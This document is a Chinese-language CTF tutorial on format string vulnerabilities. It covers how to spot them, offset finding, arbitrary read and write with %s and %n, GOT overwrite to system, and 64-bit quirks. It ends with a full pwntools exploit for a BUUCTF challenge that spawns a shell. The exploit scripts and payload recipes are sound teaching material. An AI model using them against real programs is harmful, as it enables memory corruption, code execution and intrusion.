# 格式化字符串

关键词：格式化字符串 format string FSB printf 格式化字符串漏洞 %p %n %hn %hhn %s GOT劫持 GOT overwrite 任意地址写 任意地址读 fmtstr_payload 偏移 参数寄存器 64位 泄露 canary libc

## ① 识别指纹

- 程序把你输入的内容**原样打印**回来，你输入什么就显示什么
- 输入 `%p` 后回显出现 `0x...` 或 `(nil)`；输入 `%s` 直接崩
- 输入一长串 `%p` 会吐出一堆十六进制值 —— 格式串被当成了真正的格式串
- `objdump`/IDA 里看到 `printf(buf)`、`fprintf(stdout, buf)`、`snprintf(..., buf)`，参数直接是缓冲区
- 程序先读名字/留言，再"回显"，通常还有第二次输入（口令、选项）
- 32 位、`No PIE`、`Partial RELRO` 的题最常见（GOT 可写）
- 题名/提示：`echo`、`name`、`printf`、`format`、`fmt`、`feedback`
- `checksec` 本身不能确认格式串；但 **RELRO 决定你能写哪里**

## ② 考什么

- 偏移定位：`AAAA.%p.%p...`，看 `41414141` 落在第几个
- `%p` 扫栈：识别栈地址 / libc 地址 / 堆地址 / canary / 返回地址
- `%s` 任意读：把目标地址放进参数槽，读该地址处的字符串
- `%n` 家族：`%n` 写 4 字节、`%hn` 写 2 字节、`%hhn` 写 1 字节、`%ln` 写一个 `long`（64 位 8 字节、32 位 4 字节）
- 任意地址写：目标地址必须落在某个参数槽里，用 `%<槽号>$n` 命中
- GOT 劫持：`printf@got → system`、`atoi@got → system`、`free@got → system`
- Full RELRO 的替代目标：`__free_hook`/`__malloc_hook`（2.34 前）、栈上返回地址、`__exit_funcs`
- 栈上已有指针：不能注入地址时，用现成的指针槽完成写
- 64 位 ABI：前 6 个整型参数在 `rdi/rsi/rdx/rcx/r8/r9`，第 6 个可变形参起在栈上，偏移从 6 起算
- 64 位地址的 `\x00` 截断问题与 payload 布局
- `fmtstr_payload` 的自动构造与 `write_size` 参数

## ③ 判断流程

### ③-1 子类型分流

1. 先发 `%p.%p.%p`：回显里出现 `0x...` → 格式串可控，进 2；原样回显但不解析 → 不是本题，回 [题型总表](/map)
2. 程序有没有一个"判断变量/口令变量/校验标志"，一次写就能改成已知值？→ 有 → **写链 B 的目标 1**（成本最低），走 ③-2 B 组；没有 → 进 3
3. 需要把内存里的东西读出来（flag、libc 地址、PIE 地址）？→ 需要 → **读链 A**，走 ③-2 A 组；不需要 → 进 4
4. 要写的是控制流（GOT/hook/返回地址）时，先看 RELRO：`Partial RELRO`/`No RELRO` 走 GOT；`Full RELRO` 走 hook（≤2.33）或栈/`__exit_funcs` → 进 5
5. 输入缓冲区是否直接作为格式串，且后面还有第二次输入或能复用同一缓冲区？→ 能，目标地址可以塞进参数槽，直接 `%<槽号>$n`；不能 → **栈上已有指针流**，走 ③-2 C 组
6. 64 位且偏移对不上（差 1–2，或寄存器里全是 0）→ 按 ③-2 D 组的寄存器规则重数；仍不对 → 回第 1 条
7. 以上都不成立 → 回第 1 条，用 `FmtStr` 自动探测偏移；仍无解 → 回 [题型总表](/map)

### ③-2 成本排序链

**A. 读 / 泄露（最便宜，先做）**

1. 发 `AAAA.%p.%p.%p.%p.%p.%p.%p.%p`（32 位）或 16 个 `%p`（64 位），找回显里含 `41414141` 的位置；那个 `%p` 的序号就是缓冲区起始偏移 `N`；零成本 → 进 2
2. 没有 `41414141`：把标记换成 8 字节唯一串（`AAAABBBB`），或用 `FmtStr(exec_fmt).offset` 自动测 → 进 3
3. 读任意地址：payload = `p32/p64(addr)` + `%<k>$s`，`k` 是地址所在参数槽的序号（地址从缓冲区开头放时通常就是 `N`，差 1 就试 `N±1`）→ 进 4
4. 泄露 libc：让 `%<k>$s` 指向 `puts@got`/`printf@got`，收 6 字节后 `u64(recv(6).ljust(8, b'\x00'))`，减去 libc 符号偏移得到 base → 进 5
5. 泄露 PIE/栈：`%<k>$s` 指向已知偏移的 GOT 条目或栈上返回地址；也可以直接 `%<k>$p` 读栈上的返回地址 → 进 6
6. `%s` 段错误 → 地址无效/未对齐/不是可读映射；回到第 3 条换地址，或先确认地址来自合法泄露 → 拿到数据结束

**B. 写 / 控制流**

1. 先按 A 组第 1–2 条定偏移 `N`；没有偏移就没有写 → 进 2
2. 列目标，按成本从低到高：① 程序自己的判断变量（口令/flag 校验）→ ② Partial RELRO 的 GOT 条目 → ③ `__free_hook`/`__malloc_hook`（glibc ≤ 2.33）→ ④ 栈上返回地址 / `__exit_funcs` → 进 3
3. 把目标地址放进参数槽：payload 开头依次放 `p32/p64(addr)`，记下每个地址落在第几个槽；64 位地址含 `\x00` 时改把地址放到格式指令**之后**（见 D 组第 3–4 条）→ 进 4
4. 算写入宽度：把要写的值按小端拆成 1/2/4 字节，按地址升序、数值从小到大排列；用 `%<width>c%<k>$hhn`（或 `%hn`）补足已打印字符数，大数用一次宽 `%c` 完成 → 进 5
5. 直接生成：`fmtstr_payload(N, {addr: value}, write_size='short')`；默认 `write_size='byte'`，64 位用 `'short'` 更稳；传 `bytes` 而不是 `int` 才能限制写入的总字节数 → 进 6
6. 触发：覆盖 `printf@got` 为 `system` 后，下一次让程序 `printf(你的输入)`，输入 `/bin/sh`；覆盖 `atoi@got` 后，下一次输入 `/bin/sh`；覆盖判断变量后，直接走程序原本的通过分支 → 进 7
7. 验证：用 A 组读回该地址确认值变了；没变 → 回第 3 条查槽号，或回第 2 条查 RELRO；值变了但没反应 → 回第 6 条查触发点 → 结束

**C. 栈上已有指针（不能注入地址时）**

1. 先扫 `%p`，找指向输入缓冲区或栈帧的指针（值形如 `0x7fff...`/`0x7ffc...`），记录槽号；零成本 → 进 2
2. 某槽的值正好等于缓冲区地址时，`%<槽号>$n` 就写到缓冲区自身；可以改缓冲区里预置的返回地址、长度或索引 → 进 3
3. 程序把某个栈变量地址作为参数传给 `printf`（源码里 `printf(fmt, &var)` 这类）时，该槽就是现成的写目标，直接 `%<槽号>$n` → 进 4
4. 找不到可用指针 → 回 ③-1 第 5 条，改用两段输入把目标地址塞进缓冲区；仍不行 → 换攻击面结束

**D. 64 位参数与截断**

1. 数参数：`rdi` 是格式串本身，可变形参从 `rsi/rdx/rcx/r8/r9` 开始，第 6 个可变形参落到栈上 —— 所以栈上数据的起始偏移是 6；零成本 → 进 2
2. 用 `AAAA.%p.%p...` 实测，缓冲区起始通常出现在第 6–8 个位置；差 1–2 是编译器与调用点差异，以实测为准 → 进 3
3. 地址 8 字节、高字节是 `\x00`：`printf` 解析格式串时会在 `\x00` 处停止，所以把地址写在格式指令**前面**会让 `%n` 完全不执行 → 进 4
4. 把地址移到格式指令之后、按 8 字节对齐，并把 `%<k>$` 的槽号加上「地址占用的槽数」；地址照常 `p64` 发送，`\x00` 只会截断解析，而此时所有格式指令都已被处理 → 结束

## ④ 工具与命令

```bash
checksec --file=./pwn
readelf -r ./pwn | grep -E 'printf|puts|atoi|free'    # GOT 条目
objdump -R ./pwn | grep -E 'printf|puts|atoi|free'    # 同上，另一种写法
objdump -d -M intel ./pwn | grep -A 30 '<main>:'      # 看 printf 的调用点与参数
```

```python
from pwn import *
context.binary = elf = ELF('./pwn')

# 第一步永远是定位偏移
p = process('./pwn')
p.sendline(b'AAAA.%p.%p.%p.%p.%p.%p.%p.%p')
print(p.recvline())

# 自动探测偏移（exec_fmt 负责发 payload 并取回显）
# from pwnlib.fmtstr import FmtStr
# offset, _ = FmtStr(exec_fmt).offset

# 任意地址写：offset 是缓冲区起始槽号
payload = fmtstr_payload(10, {0x804C044: 0x1111}, write_size='short')
```

```python
# 任意地址读：地址放在缓冲区开头，k 为该地址所在槽号
payload = p32(elf.got['printf']) + b'%7$s'
p.sendline(payload)
leak = u32(p.recv(4))
libc_base = leak - libc.symbols['printf']
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| 偏移对不上，差 1–2 | 64 位寄存器参数与格式串本身占位的计数差异 | 以 `41414141`/`AAAABBBB` 的实测位置为准，试 `N±1` |
| `%n` 完全没执行，程序正常结束 | 64 位地址含 `\x00`，格式串在地址处被截断 | 地址移到格式指令之后、8 字节对齐，槽号加上地址占用的槽数 |
| `%n` 段错误 | 目标地址不是可写映射，或槽里放的不是该地址 | 用 A 组读回确认槽号；检查 RELRO 与地址 |
| 写了 GOT 但程序行为没变 | Full RELRO，GOT 只读 | 换 hook（≤2.33）/栈返回地址/`__exit_funcs` |
| 改了 GOT 但没触发 | 目标函数之后没被调用，或首次调用走 PLT 延迟绑定 | 让程序再调用一次该函数；确认写的是 GOT 条目而非 PLT |
| `%s` 一读就崩 | 地址无效、未对齐或不可读 | 只用合法泄露得到的地址；先用 `%p` 确认栈上确实有该指针 |
| 输出太长导致超时 | 直接写 4 字节的大数 | 用 `%hn`/`%hhn` 分字节，`write_size='short'` |
| 写入值总是差一点 | 前面已打印的字符数没算进 `%c` 的宽度 | 用 `fmtstr_payload`，或手工减去已输出长度 |
| 64 位生成出来的是 4 字节地址 | `context.bits` 没设，pwntools 按 32 位生成 | `context.binary = elf` 或 `context.arch = 'amd64'` |
| 判断变量改完仍走失败分支 | 只写了 1 字节，变量实际是 4 字节 | 按变量宽度选 `%n`/`%hn`/`%hhn`，并按小端核对 |

## ⑥ 例题

**题目**：`[第五空间 2019 决赛] PWN5`
**来源**：第五空间 2019 决赛；BUUCTF 收录，题目入口与附件以原题平台为准

**题干**：程序先读入一段内容并 `printf` 出来，再要求输入一个口令；口令与程序启动时从 `/dev/urandom` 读到的 4 字节随机数相等，才会执行 `system("/bin/sh")`。

**关键观察**：
- `checksec`：32 位、**Canary found、NX enabled、No PIE**（随机数在固定全局地址 `0x804C044`）
- `printf(nptr)` 直接拿输入当格式串 —— 漏洞点
- 判断变量是全局的 `dword_804C044`，一次写就能改，不需要泄露随机数
- 程序在 `printf` 之后还会再读一次输入（口令），这就是触发点

**走了哪条链**：③-1 第 1 条（`%p` 回显确认可控）→ 第 2 条（存在全局口令变量，走写链）→ ③-2 B 组第 1 条（定偏移 `N = 10`）→ 第 2 条（目标 `0x804C044`）→ 第 5 条（`fmtstr_payload`）→ 第 6 条（发 `4369` 触发 `atoi` 比较）。

**命令与输出**（checksec 输出节选，本题写的是全局变量，RELRO 与利用无关）：

```text
$ checksec --file=./pwn
    Arch:     i386-32-little
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
```

偏移用探针实测：把 `AAAA` 放在开头，回显里 `41414141` 落在第 10 个 `%p`，所以 `N = 10`。

```python
from pwn import *
context.binary = elf = ELF('./pwn')
p = remote('node4.buuoj.cn', 26000)      # 端口以平台为准

# 把全局口令变量改成 0x1111（十进制 4369）
payload = fmtstr_payload(10, {0x804C044: 0x1111})
p.sendline(payload)
p.sendline(str(0x1111).encode())         # 第二次输入是口令，atoi 后等于 0x1111
p.interactive()
```

```text
$ cat flag
flag{...}
```

**结果**：拿到 shell，读 flag。`flag{...}` 仅为占位，实际内容以 BUUCTF 原题为准。

::: tip 另一条同样便宜的路
不写变量，直接读：`payload = p32(0x804C044) + b'%10$s'`，从回显里收回那 4 字节随机数，再用 `str(u32(random))` 作为口令发回去。读链写链的代价几乎一样，考场上哪个顺手用哪个。
:::
